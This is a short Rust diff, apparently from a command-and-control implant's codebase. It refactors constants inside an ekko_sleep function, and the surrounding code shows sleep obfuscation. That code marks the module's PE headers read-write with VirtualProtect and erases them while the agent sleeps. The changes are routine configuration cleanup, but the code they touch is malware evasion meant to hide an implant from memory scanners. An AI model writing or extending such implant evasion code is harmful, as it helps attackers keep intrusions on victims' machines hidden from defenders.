@@ -191,10 +191,14 @@ pub fn ekko_sleep(duration_ms: u32) {
         fn Sleep(ms: u32);
     }
 
+    // OS-fixed (winnt.h) values with no typed-config mirror stay const.
     const PAGE_READONLY:      u32 = 0x02;
-    const PAGE_READWRITE:     u32 = 0x04;
     const WT_EXECUTEONLYONCE: u32 = 0x00000008;
-    const HEADER_BACKUP:     usize = 0x1000; // 4 KiB - covers all standard PE headers
+    // Header backup size lives in config_consts: it sizes a stack array,
+    // a const-eval context. 4 KiB - covers all standard PE headers.
+    const HEADER_BACKUP: usize = crate::config_consts::EKKO_HEADER_BACKUP_BYTES;
+    // PAGE_READWRITE is mirrored by the typed FFI config.
+    let page_readwrite = crate::config::config().ffi_windows.page_readwrite;
     let invalid_handle: *mut c_void = -1_isize as *mut c_void; // INVALID_HANDLE_VALUE
 
     // ── Shared state between agent fiber and clean fiber ───────────────
@@ -232,7 +236,7 @@ pub fn ekko_sleep(duration_ms: u32) {
                 HEADER_BACKUP,
             );
             if VirtualProtect(module_base as *mut c_void, HEADER_BACKUP,
-                               PAGE_READWRITE, &mut header_old_prot) != 0
+                               page_readwrite, &mut header_old_prot) != 0
             {
                 std::ptr::write_bytes(module_base, 0u8, HEADER_BACKUP);
                 headers_erased = true;
